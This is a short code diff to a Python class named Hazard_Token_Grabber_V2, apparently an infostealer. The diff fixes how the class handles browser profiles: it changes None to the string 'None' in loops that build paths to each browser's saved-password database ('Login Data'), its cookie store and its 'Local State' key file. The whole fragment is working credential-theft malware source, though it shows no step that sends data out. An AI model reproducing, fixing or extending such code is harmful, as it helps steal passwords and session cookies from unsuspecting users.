@@ -438,7 +438,7 @@ class Hazard_Token_Grabber_V2(functions):
             profiles = self.findProfiles(name, path)
             if profiles == []:
                 login_db = path + '\\Login Data'
-                profiles = [None]
+                profiles = ["None"]
             for profile in profiles:
                 localState = path + '\\Local State'
                 if profile == 'def':
@@ -448,7 +448,7 @@ class Hazard_Token_Grabber_V2(functions):
                     localState = path + "_side_profiles\\" + profile + '\\Local State'
                     if not os.path.exists(localState):
                         continue
-                elif profile == None:
+                elif profile == "None":
                     pass
                 else:
                     login_db = path + f'{profile}\\Login Data'
@@ -485,7 +485,7 @@ class Hazard_Token_Grabber_V2(functions):
             profiles = self.findProfiles(name, path)
             if profiles == []:
                 login_db = path + '\\Network\\cookies'
-                profiles = [None]
+                profiles = ["None"]
             for profile in profiles:
                 localState = path + '\\Local State'
                 if profile == 'def':
@@ -495,7 +495,7 @@ class Hazard_Token_Grabber_V2(functions):
                     localState = path + "_side_profiles\\" + profile + '\\Local State'
                     if not os.path.exists(localState):
                         continue
-                elif profile == None:
+                elif profile == "None":
                     pass
                 else:
                     login_db = path + f'{profile}\\Network\\cookies'
